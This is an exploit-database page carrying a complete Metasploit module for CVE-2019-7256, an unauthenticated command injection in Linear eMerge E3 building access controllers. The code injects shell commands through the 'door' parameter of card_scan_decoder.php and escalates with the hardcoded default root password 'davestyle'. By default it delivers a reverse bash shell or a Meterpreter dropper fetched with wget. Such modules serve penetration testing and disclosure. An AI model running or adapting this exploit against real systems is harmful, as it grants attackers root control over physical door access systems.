---
title: Linear eMerge E3-Series Access Controller Command Injection
url: https://cxsecurity.com/issue/WLB-2023010004
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-06
fetch_date: 2025-10-04T03:07:18.625963
---

# Linear eMerge E3-Series Access Controller Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Linear eMerge E3-Series Access Controller Command Injection** **2023.01.05**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex/stopwatch'
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Linear eMerge E3-Series Access Controller Command Injection',
'Description' => %q{
This module exploits a command injection vulnerability in the Linear eMerge
E3-Series Access Controller. The Linear eMerge E3 versions `1.00-06` and below are vulnerable
to unauthenticated command injection in card\_scan\_decoder.php via the `No` and `door` HTTP GET parameter.
Successful exploitation results in command execution as the `root` user.
},
'License' => MSF\_LICENSE,
'Author' => [
'Gjoko Krstic <gjoko[at]applied-risk.com>', # Discovery
'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor
],
'References' => [
[ 'CVE', '2019-7256'],
[ 'URL', 'https://applied-risk.com/resources/ar-2019-005' ],
[ 'URL', 'https://na.niceforyou.com/' ],
[ 'URL', 'https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256' ],
[ 'EDB', '47649'],
[ 'PACKETSTORM', '155256']
],
'DisclosureDate' => '2019-10-29',
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH\_CMD, ARCH\_ARMLE],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse\_bash'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_ARMLE],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => [ 'wget', 'printf', 'echo' ],
'DefaultOptions' => {
'PAYLOAD' => 'linux/armle/meterpreter\_reverse\_tcp'
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 80,
'SSL' => false
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options(
[
OptString.new('ROOT\_PASSWORD', [ true, 'default root password on a vulnerable Linear eMerge E3-Series access controller', 'davestyle']),
]
)
end
def execute\_command(cmd, \_opts = {})
random\_no = rand(30..100)
return send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'card\_scan\_decoder.php'),
'vars\_get' =>
{
'No' => random\_no,
'door' => "`echo #{datastore['ROOT\_PASSWORD']}|su -c \"#{cmd}\"`"
}
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
fail\_with(Failure::Unknown, "Communication error occurred: #{e.message}")
end
# Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution
def check
print\_status("Checking if #{peer} can be exploited.")
sleep\_time = rand(2..10)
print\_status("Performing command injection test issuing a sleep command of #{sleep\_time} seconds.")
res, elapsed\_time = Rex::Stopwatch.elapsed\_time do
execute\_command("sleep #{sleep\_time}")
end
return CheckCode::Unknown('No response received from the target!') unless res
return CheckCode::Safe('Target is not affected by this vulnerability.') unless res.code == 200 && !res.body.blank? && res.body =~ /"card\_format\_default":"/
print\_status("Elapsed time: #{elapsed\_time.round(2)} seconds.")
return CheckCode::Safe('Command injection test failed.') unless elapsed\_time >= sleep\_time
CheckCode::Vulnerable('Successfully tested command injection.')
end
def exploit
case target['Type']
when :unix\_cmd
print\_status("Executing #{target.name} with #{payload.encoded}")
# Don't check the response here since the server won't respond
# if the payload is successfully executed.
execute\_command(payload.encoded)
when :linux\_dropper
print\_status("Executing #{target.name}")
execute\_cmdstager(linemax: 262144)
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010004)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top